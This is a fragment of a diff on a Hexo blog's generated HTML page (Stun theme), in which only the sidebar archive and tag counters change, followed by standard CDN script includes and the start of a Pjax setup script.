 <p>More info: <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html" >Deployment</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
-</div></div></article></section><nav class="paginator"><div class="paginator-inner"><span class="page-number current">1</span></div></nav></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><section class="sidebar-toc hide"></section><!-- ov = overview--><section class="sidebar-ov"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/head.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">不确定的话，那就遵从兴趣吧</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">2</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">0</div><div class="sidebar-ov-state-item__name">分类</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">0</div><div class="sidebar-ov-state-item__name">标签</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-cn" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 大力支持</span><span> v6.3.0</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.8.0</span></div><div>看到最后是不是觉得我很菜</div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax@latest/pjax.min.js"></script><script>window.addEventListener('DOMContentLoaded', function () {
+</div></div></article></section><nav class="paginator"><div class="paginator-inner"><span class="page-number current">1</span></div></nav></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><section class="sidebar-toc hide"></section><!-- ov = overview--><section class="sidebar-ov"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/head.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">不确定的话，那就遵从兴趣吧</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">6</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">0</div><div class="sidebar-ov-state-item__name">分类</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">4</div><div class="sidebar-ov-state-item__name">标签</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-cn" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 大力支持</span><span> v6.3.0</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.8.0</span></div><div>看到最后是不是觉得我很菜</div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax@latest/pjax.min.js"></script><script>window.addEventListener('DOMContentLoaded', function () {
   var pjax = new Pjax({"selectors":["head title","#main",".pjax-reload",".header-banner"],"history":true,"scrollTo":false,"scrollRestoration":false,"cacheBust":false,"debug":false,"currentUrlFullReload":false,"timeout":0});
   // 加载进度条的计时器
   var loadingTimer = null;
